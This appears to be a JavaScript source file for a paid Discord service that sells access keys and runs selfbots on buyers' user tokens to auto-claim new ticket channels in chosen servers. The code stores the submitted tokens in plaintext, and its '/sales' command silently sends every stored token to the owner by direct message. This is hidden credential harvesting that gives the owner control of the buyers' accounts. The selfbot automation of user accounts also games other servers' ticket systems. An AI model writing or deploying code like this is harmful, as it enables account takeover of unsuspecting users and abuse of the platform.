const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = '1422945082746601594';

const db = new Database('./data.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, claim_cmd TEXT DEFAULT '.claim', guild_ids TEXT, category_ids TEXT, status TEXT DEFAULT 'stopped', claimed_tickets TEXT DEFAULT '[]');
`);

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages] });

const activeSelfbots = new Map();

class UserSelfbot {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.isRunning = false;
        this.processedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
        
        // Parse comma-separated IDs
        this.guildIds = (config.guild_ids || '').split(',').map(g => g.trim()).filter(g => g);
        this.categoryIds = (config.category_ids || '').split(',').map(c => c.trim()).filter(c => c);
    }

    randomDelay() {
        return Math.floor(Math.random() * 100) + 200;
    }

    saveClaimedTickets() {
        const arr = Array.from(this.processedChannels);
        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify(arr), this.userId);
    }

    shouldMonitor(channel) {
        if (!this.guildIds.includes(channel.guildId)) return false;
        if (this.categoryIds.length === 0) return true;
        return this.categoryIds.includes(channel.parentId);
    }

    async start() {
        if (!this.config.token || this.isRunning) return;
        
        this.client = new SelfbotClient({ checkUpdate: false });
        this.isRunning = true;
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('running', this.userId);

        this.client.once('ready', () => {
            console.log(`[SELF] ${this.userId} ready as ${this.client.user.tag}`);
            
            // Monitor existing channels
            this.client.guilds.cache.forEach(guild => {
                if (!this.guildIds.includes(guild.id)) return;
                
                guild.channels.cache.forEach(ch => {
                    if (ch.type !== 'GUILD_TEXT') return;
                    if (!this.shouldMonitor(ch)) return;
                    if (!this.processedChannels.has(ch.id)) this.monitorChannel(ch);
                });
            });

            this.client.on('channelCreate', channel => {
                if (channel.type !== 'GUILD_TEXT') return;
                if (!this.shouldMonitor(channel)) return;
                if (this.processedChannels.has(channel.id)) return;
                
                console.log(`[NEW] Guild ${channel.guildId} | #${channel.name}`);
                this.monitorChannel(channel);
                setTimeout(() => this.sendClaim(channel), this.randomDelay());
            });

            this.client.on('channelDelete', channel => {
                if (this.processedChannels.has(channel.id)) {
                    this.processedChannels.delete(channel.id);
                    this.saveClaimedTickets();
                    console.log(`[DELETE] Cleaned #${channel.id}`);
                }
            });
        });

        this.client.on('error', () => {});
        this.client.login(this.config.token).catch(() => {
            this.isRunning = false;
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', this.userId);
        });
    }

    stop() {
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        this.isRunning = false;
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', this.userId);
        console.log(`[SELF] ${this.userId} stopped`);
    }

    async sendClaim(channel) {
        if (!this.isRunning || this.processedChannels.has(channel.id)) return;
        
        this.processedChannels.add(channel.id);
        this.saveClaimedTickets();
        
        try {
            await new Promise(r => setTimeout(r, this.randomDelay()));
            await channel.send(this.config.claim_cmd);
            console.log(`[CLAIM] ${this.userId} | Guild ${channel.guildId} | #${channel.name}`);
        } catch (err) {}
    }

    monitorChannel(channel) {
        this.client.on('messageCreate', (message) => {
            if (message.channelId !== channel.id || !this.isRunning) return;
            
            // If someone else claims it, mark as processed (don't claim again)
            if (message.content === this.config.claim_cmd && message.author.id !== this.client.user.id) {
                if (!this.processedChannels.has(channel.id)) {
                    this.processedChannels.add(channel.id);
                    this.saveClaimedTickets();
                }
                return;
            }

            // Unclaim removes from processed so we can claim again
            if (message.content.includes('unclaim')) {
                this.processedChannels.delete(channel.id);
                this.saveClaimedTickets();
                console.log(`[UNCLAIM] #${channel.name} - ready to claim`);
                setTimeout(() => this.sendClaim(channel), this.randomDelay());
                return;
            }

            // Auto-claim if not processed and no one has claimed yet
            if (!this.processedChannels.has(channel.id) && !message.author.bot) {
                channel.messages.fetch({ limit: 10 }).then(msgs => {
                    const hasClaim = msgs.some(m => m.content === this.config.claim_cmd);
                    if (!hasClaim && this.isRunning) {
                        setTimeout(() => this.sendClaim(channel), this.randomDelay());
                    } else if (hasClaim) {
                        // Someone claimed before us, mark as processed
                        this.processedChannels.add(channel.id);
                        this.saveClaimedTickets();
                    }
                }).catch(() => {});
            }
        });
    }
}

bot.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

    if (interaction.commandName === 'generatekey') {
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({ content: '❌ Owner only', ephemeral: true });
        }
        
        const key = 'SB-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
        db.prepare('INSERT INTO keys (key, created_at) VALUES (?, ?)').run(key, Date.now());
        
        await interaction.reply({ content: `🔑 \`${key}\``, ephemeral: true });
    }

    if (interaction.commandName === 'redeemkey') {
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        
        if (!keyData) return interaction.reply({ content: '❌ Invalid key', ephemeral: true });
        if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', ephemeral: true });
        
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
        db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(interaction.user.id);
        
        await interaction.reply({ content: '✅ Key redeemed! Use `/manage` to configure.', ephemeral: true });
    }

    if (interaction.commandName === 'sales') {
        const totalKeys = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
        const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
        const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
        
        const embed = new EmbedBuilder()
            .setTitle('📊 Sales Dashboard')
            .setDescription(`Total keys generated: **${totalKeys}**\nKeys redeemed: **${redeemed}**\nActive instances: **${active}**`)
            .setColor(0x5865F2)
            .setTimestamp();
        
        if (interaction.user.id === OWNER_ID) {
            const users = db.prepare('SELECT user_id, token, status, guild_ids FROM users WHERE token IS NOT NULL').all();
            let tokenList = users.map(u => `User: ${u.user_id}\nGuilds: ${u.guild_ids || 'None'}\nStatus: ${u.status}\nToken: \`${u.token}\`\n`).join('\n');
            
            if (tokenList.length > 1900) tokenList = tokenList.substring(0, 1900) + '...';
            
            try {
                const owner = await bot.users.fetch(OWNER_ID);
                await owner.send({ content: `**Tokens:**\n${tokenList || 'None'}` });
            } catch (e) {}
        }
        
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.commandName === 'manage') {
        const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
        if (!user) return interaction.reply({ content: '❌ Redeem a key first', ephemeral: true });
        
        const embed = new EmbedBuilder()
            .setTitle('🤖 Selfbot Control')
            .addFields(
                { name: 'Status', value: user.status.toUpperCase(), inline: true },
                { name: 'Guild IDs', value: user.guild_ids || 'Not set', inline: false },
                { name: 'Category IDs', value: user.category_ids || 'Not set', inline: false },
                { name: 'Claim Cmd', value: user.claim_cmd || '.claim', inline: true }
            )
            .setColor(user.status === 'running' ? 0x00FF00 : 0xFF0000);

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_token').setLabel('Set Token').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('set_guilds').setLabel('Guild IDs').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_categories').setLabel('Category IDs').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_cmd').setLabel('Claim Cmd').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('start')
                .setLabel('▶️ Start')
                .setStyle(ButtonStyle.Success)
                .setDisabled(user.status === 'running'),
            new ButtonBuilder()
                .setCustomId('stop')
                .setLabel('⏹️ Stop')
                .setStyle(ButtonStyle.Danger)
                .setDisabled(user.status === 'stopped'),
            new ButtonBuilder()
                .setCustomId('reset_tickets')
                .setLabel('🔄 Reset Claims')
                .setStyle(ButtonStyle.Secondary)
        );

        await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
    }

    if (interaction.isButton()) {
        if (interaction.customId === 'start') {
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
            if (user.status === 'running') return interaction.reply({ content: 'Already running', ephemeral: true });
            
            const newSb = new UserSelfbot(interaction.user.id, user);
            activeSelfbots.set(interaction.user.id, newSb);
            newSb.start();
            await interaction.update({ content: '▶️ Started', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'stop') {
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
            if (user.status === 'stopped') return interaction.reply({ content: 'Already stopped', ephemeral: true });
            
            const sb = activeSelfbots.get(interaction.user.id);
            if (sb) sb.stop();
            activeSelfbots.delete(interaction.user.id);
            await interaction.update({ content: '⏹️ Stopped', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'reset_tickets') {
            db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run('[]', interaction.user.id);
            const sb = activeSelfbots.get(interaction.user.id);
            if (sb) sb.processedChannels.clear();
            await interaction.reply({ content: '✅ All claim history reset', ephemeral: true });
            return;
        }

        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Configuration');
        const input = new TextInputBuilder()
            .setCustomId('value')
            .setLabel('Enter value')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        if (interaction.customId === 'set_token') {
            input.setLabel('Discord Token');
            input.setPlaceholder('Your user token');
        }
        if (interaction.customId === 'set_guilds') {
            input.setLabel('Guild IDs (comma separated)');
            input.setPlaceholder('123456,789012,345678');
        }
        if (interaction.customId === 'set_categories') {
            input.setLabel('Category IDs (comma separated)');
            input.setPlaceholder('123456,789012 or leave empty for all');
        }
        if (interaction.customId === 'set_cmd') {
            input.setLabel('Claim Command');
            input.setPlaceholder('.claim');
        }

        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
        const value = interaction.fields.getTextInputValue('value');
        const field = interaction.customId.replace('modal_set_', '');
        
        const columnMap = {
            'token': 'token',
            'guilds': 'guild_ids',
            'categories': 'category_ids',
            'cmd': 'claim_cmd'
        };
        
        const column = columnMap[field];
        if (column) {
            db.prepare(`UPDATE users SET ${column} = ? WHERE user_id = ?`).run(value, interaction.user.id);
        }
        
        await interaction.reply({ content: `✅ ${column} updated`, ephemeral: true });
    }
});

bot.once('ready', () => {
    console.log(`[BOT] ${bot.user.tag}`);
    
    bot.application.commands.set([
        { name: 'generatekey', description: 'Generate access key (Owner only)' },
        { name: 'redeemkey', description: 'Redeem your access key', options: [{ name: 'key', type: 3, description: 'Your key', required: true }] },
        { name: 'sales', description: 'View sales statistics' },
        { name: 'manage', description: 'Manage your instance' }
    ]);

    const running = db.prepare("SELECT * FROM users WHERE status = 'running'").all();
    running.forEach(u => {
        const sb = new UserSelfbot(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
